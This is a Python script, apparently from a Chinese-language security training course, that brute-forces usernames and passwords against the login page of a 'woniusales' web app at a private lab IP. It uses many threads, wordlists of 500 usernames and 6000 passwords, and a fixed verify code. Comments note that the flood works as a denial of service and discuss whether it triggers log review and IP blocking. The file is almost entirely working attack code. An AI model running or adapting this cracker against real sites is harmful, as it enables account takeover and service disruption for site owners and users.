import hashlib, time, requests, threading

# 未知用户名，未知密码，多线程并行破解
# 500用户，6000条密码，最多300万次登录操作，
# 同时，由于多线程并发登录，导致服务器压力世增（DOS），进而服务器的响应时间会显著变慢
# 如果服务器不小心崩溃，那么很有可能引起重视，进而检查访问日志，封锁IP，（DDOS可以更好模拟）
# 每个用户一个线程，每一个线程循环6000次
count = 0
def ws_thread(username):
    global count

    with open('../dict/password-top6000.txt') as file:
        pw_list = file.readlines()

    url = 'http://192.168.19.132:8080/woniusales/user/login'
    session = requests.session()

    for password in pw_list:
        data = {'username': username, 'password': password.strip(), 'verifycode':'0000'}
        resp = session.post(url=url, data=data)
        if 'login-fail' not in resp.text:
            print(f'疑似破解成功, 密码为：{password.strip()}')
            print(f"共计尝试 {count} 次.")
            exit()
        count += 1

    print(f"共计尝试 {count} 次.")


# 如果用户字典有5000条数据，又该如何处理？每个线程处理10个用户。
# 本题的核心：如何给多线程分配任务，此类思路可以解决大部分多线程的常规问题，比如多线程爬虫，扫描工作等。
def ws_thread_10(sublist):
    with open('../dict/password-top6000.txt') as file:
        pw_list = file.readlines()

    url = 'http://192.168.19.132:8080/woniusales/user/login'
    session = requests.session()

    for username in sublist:
        for password in pw_list:
            data = {'username': username.strip(), 'password': password.strip(), 'verifycode':'0000'}
            resp = session.post(url=url, data=data)
            if 'login-fail' not in resp.text:
                print(f'疑似破解成功, 账号为：{username.strip()}，密码为：{password.strip()}')
                exit()



if __name__ == '__main__':

    # 读取用户字典，并遍历获取用户名
    # with open('../dict/username-top500.txt') as file:
    #     user_list = file.readlines()
    #
    # print('网站账号密码破解中...')
    # for username in user_list:
    #     threading.Thread(target=ws_thread, args=(username.strip(),)).start()


    # 每个线程负责10个用户
    with open('../dict/username-top500.txt') as file:
        user_list = file.readlines()
    print('网站账号密码破解中...')
    for i in range(0, len(user_list), 10):
        sublist = user_list[i:i+10]
        threading.Thread(target=ws_thread_10, args=(sublist, )).start()



